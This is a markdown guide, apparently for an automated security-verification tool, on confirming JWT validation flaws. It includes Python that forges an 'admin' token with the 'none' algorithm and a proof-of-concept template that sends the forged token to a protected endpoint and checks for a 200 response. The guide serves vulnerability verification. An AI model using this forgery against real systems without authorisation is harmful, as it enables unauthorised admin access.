# JWT Vulnerability

Exploit JWT signature bypass or validation flaws to forge tokens and access protected endpoints.

## Approach

1. Read the project's JWT implementation code to understand the library and token structure
2. Forge a JWT that the server will accept despite being invalid

## Token Forgery

### Approach 1: Use the project's JWT library

If the project uses a known JWT library (e.g., `jjwt`, `java-jwt`, `nimbus-jose-jwt`), use `PyJWT` in Python to construct a token with the same claim structure:

```python
import jwt  # PyJWT

# Forge a token with arbitrary claims — no valid signature needed
# because the server doesn't verify it
token = jwt.encode({"sub": "admin", "iat": 1700000000}, key="", algorithm="none")
```

### Approach 2: Manually replicate the token structure

If Approach 1 doesn't work (custom JWT logic, non-standard claims), read the project's JWT generation code and replicate the exact token structure with forged claims.

## Response Regex Verification

Construct a PoC that replaces the Authorization header with a forged JWT, sends a request to a protected endpoint, and prints the response. Match the output against a regex pattern to confirm successful access.

> See [Regex Verification](../verification/regex.md) for workflow and validation.

## PoC Template

```python
import jwt
import requests

from zast_verifier import config


if __name__ == "__main__":
    base_url = config.get_target_api_base()
    forged_token = jwt.encode({"sub": "admin"}, key="", algorithm="none")

    headers = config.get_admin_headers()
    # Replace the valid token with forged one
    headers["Authorization"] = f"Bearer {forged_token}"

    response = requests.get(
        url=f"{base_url}/protected-endpoint",
        headers=headers,
        cookies=config.get_admin_cookies(),
    )

    print(f"Status code: {response.status_code}")
    print(f"Response text: {response.text}")
```

## Validation Command

```bash
zast-verifier validate-poc -c "%poc_code%" --method regex --pattern "Status code: 200"
```
